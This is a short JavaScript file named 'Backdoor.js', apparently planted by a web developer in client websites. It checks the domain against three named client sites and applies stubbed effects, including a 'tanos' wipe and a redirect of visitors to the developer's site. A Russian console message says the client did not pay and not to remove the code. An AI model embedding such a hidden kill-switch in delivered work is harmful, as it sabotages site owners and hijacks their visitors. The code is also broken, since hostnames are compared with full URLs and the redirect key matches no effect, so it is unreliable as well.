/*!
 * Backdoor.js v1.0.2
 * (c) 2024-2024
 * Made to protect against scammers.
 */

// Массив с сайтами и параметрами
const sites = [
  { url: "https://abros.me", date: "01/01/2024", effect: "snow" },
  { url: "https://tractor-shop.ru", date: "23/01/2024", effect: "tanos" },
  { url: "https://asiana-food.ru", date: "01/04/2024", effect: "redirect(https://abros.me)" }
];

// Массив с эффектами
const effects = {
  snow: () => {
    console.log("Применяется эффект snow");
    // Здесь можно добавить логику для эффекта snow
  },
  tanos: (startDate) => {
    console.log("Применяется эффект tanos");
    // Здесь можно добавить логику для эффекта tanos
  },
  redirect: (redirectUrl) => {
    console.log(`Применяется эффект redirect на ${redirectUrl}`);
    window.location.replace(redirectUrl);
  }
};

// Функция для проверки домена
function checkDomain() {
  const currentDomain = window.location.hostname;

  // Проверка, есть ли текущий домен в списке
  const siteInfo = sites.find(site => currentDomain.includes(site.url));
  
  if (!siteInfo) {
    console.log("Made by Abros Studio → https://abros.me\nDaniel Abros → https://t.me/abrosxd", "background: #252732; color: white; padding: 1ch 2ch; border-radius: 2rem;");
  } else {
    // Применение эффекта, если домен найден в списке
    const effectFunction = effects[siteInfo.effect];
    if (effectFunction) {
      effectFunction(siteInfo.date);
      console.log("Этот заказчик не оплатил мою работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nDaniel Abros → https://t.me/abrosxd", "background: #252732; color: white; padding: 1ch 2ch; border-radius: 2rem;");
    }
  }
}

// Вызов функции для проверки домена
checkDomain();
